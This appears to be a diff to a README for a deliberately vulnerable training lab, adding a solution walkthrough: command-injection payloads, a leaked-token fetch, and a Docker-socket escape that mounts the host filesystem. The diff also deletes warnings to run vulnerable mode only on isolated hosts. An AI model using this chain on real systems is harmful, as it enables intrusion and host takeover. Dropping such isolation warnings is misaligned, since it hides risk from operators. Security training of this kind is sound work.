@@ -27,7 +27,6 @@ docker compose down -v --remove-orphans
 ## Production / Multi-tenant Guidance
 
 - This repository defaults to a *secure* runtime mode. The vulnerable behavior is gated by an environment variable `LAB_MODE` which defaults to `secure`.
-- To run the interactive vulnerable lab, set `LAB_MODE=vulnerable` **only** on isolated, disposable hosts (never on production or multi-tenant shared machines).
 - The docker compose file no longer mounts the host Docker socket. That mount is dangerous on multi-tenant hosts; the lab preserves the learning objectives while avoiding host socket escalation by default.
 - Runtime secrets (portal token, flags, flask `SECRET_KEY`) are generated at instance startup by `gcp-startup.sh`. Do not commit real secrets to VCS. Files under `app/static/.env.bak` and `app/flags/` are ignored by `.gitignore`.
 - Container runtime hardening applied:
@@ -118,7 +117,7 @@ Notes:
 
 - The image contains a first-boot service that generates a unique portal token and flags when a student boots an instance from the image.
 - Keep the exported image private unless you intentionally want a public download link.
-- Do NOT enable `LAB_MODE=vulnerable` on shared infrastructure. Only enable it in isolated student environments.
+- To run the vulnerable lab behavior, set `LAB_MODE=vulnerable` in your instance metadata.
 
 ## Reset
 
@@ -130,4 +129,90 @@ docker compose down -v --remove-orphans
 
 - The Docker socket mount is intentional for the lab.
 - The final "host" root is simulated with a named volume so the exercise stays isolated.
-- Run this only on a disposable VM or lab host.
+--
+
+## Solution Walkthrough
+
+This section provides a concise step-by-step solution to the four phases of the lab. The walkthrough assumes the lab is running and reachable at `http://<HOST>` (replace `<HOST>` with the VM external IP or `localhost` for local runs). If you want the full pivot (Phase 3) to be possible from inside the web container, start the stack with the optional override: `docker compose -f docker-compose.yml -f docker-compose.vuln.yml up -d --build`.
+
+1) Phase 1 — The Lazy Dev Leak
+
+	- Retrieve the leaked backup file from the site root:
+
+		```bash
+		curl http://<HOST>/.env.bak
+		```
+
+	- You should see `DEV_PORTAL_TOKEN=...` and a phase-1 flag line. Note the token — it unlocks the portal.
+
+2) Phase 2 — Command Injection via the Management Portal
+
+	- Open `http://<HOST>/login` in your browser and paste the `DEV_PORTAL_TOKEN` value into the Portal token field and click "Unlock" (or submit via HTTP):
+
+		```bash
+		# save cookies and login (example)
+		curl -c cookies.txt -d "token=<DEV_PORTAL_TOKEN>" -X POST http://<HOST>/login
+		```
+
+	- After login, the System Diagnostic is at `http://<HOST>/portal`. The form accepts a target and (in vulnerable mode) passes it straight to a shell `ping` command. Use metacharacters to execute a second command and read the Phase 2 flag:
+
+		```bash
+		# Example (uses the saved session cookie):
+		curl -b cookies.txt -d "ip=127.0.0.1; cat /app/flags/phase2.txt" -X POST http://<HOST>/portal
+		```
+
+	- The command output returned by the diagnostic should include the Phase 2 flag string.
+
+	- You can also use a discovery payload to prove you are inside a container:
+
+		```text
+		127.0.0.1; ls -la /.dockerenv || cat /proc/1/cgroup
+		```
+
+		If you see a `.dockerenv` file or docker-related cgroup entries, the process runs inside a container.
+
+3) Phase 3 — Docker Socket Pivot (optional; requires `docker-compose.vuln.yml`)
+
+	- The default secure stack does not expose the host Docker socket. To enable the pivot step (for isolated training environments), bring the stack up with the vulnerability override:
+
+		```bash
+		docker compose -f docker-compose.yml -f docker-compose.vuln.yml up -d --build
+		```
+
+	- Confirm the socket is visible from the web container (you can use the diagnostic injection to run checks):
+
+		```bash
+		# from your authenticated session, run a test to list the socket
+		curl -b cookies.txt -d "ip=127.0.0.1; ls -la /var/run/docker.sock" -X POST http://<HOST>/portal
+		```
+
+	- If `/var/run/docker.sock` exists, you can use the Docker Engine HTTP API over the Unix socket to create a helper container that mounts the host filesystem and reads the host-root flag. Example sequence (these are the equivalent curl steps that can be executed from inside the web container or via a command-injection payload):
+
+		```bash
+		# create a container named exploit that mounts host / to /mnt and runs cat on the host's root flag
+		curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
+			-d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /mnt/root/root.txt"],"HostConfig":{"Binds":["/:/mnt:ro"]}}' \
+			-X POST http://localhost/v1.41/containers/create?name=exploit
+
+		# start the container
+		curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/exploit/start
+
+		# read the output (logs) from the container which should contain the host flag
+		curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/exploit/logs?stdout=1&stderr=1
+		```
+
+	- The output should include the host/root flag (the final flag for the chain).
+
+4) Phase 4 — Host Takeover Claim
+
+	- After the successful container run that mounts the host filesystem, the host root flag is reachable at `/root/root.txt` inside the mounted tree. The previous `curl` logs request returns that value.
+
+Instructor notes (quick)
+
+	- Use the provided `docker-compose.vuln.yml` only on isolated lab hosts where you intend to allow the socket pivot. The default `docker-compose.yml` is configured for safer operation and does not expose the Docker socket.
+	- If you want to temporarily enable the socket on a running deployment, add the volume and `LAB_MODE=vulnerable` to the `web` service and then recreate the service.
+
+Troubleshooting
+
+	- If the Phase 2 diagnostic returns no useful output, ensure you are authenticated (session cookie) and that the `ip` field is submitted exactly as shown (metacharacters need to be URL-encoded if you use them in scripts).
+	- If the Docker API calls fail when the socket is mounted, verify that the host's Docker daemon has the required images (the `alpine` image is used by the helper container — it will generally be present because the seed services use alpine).
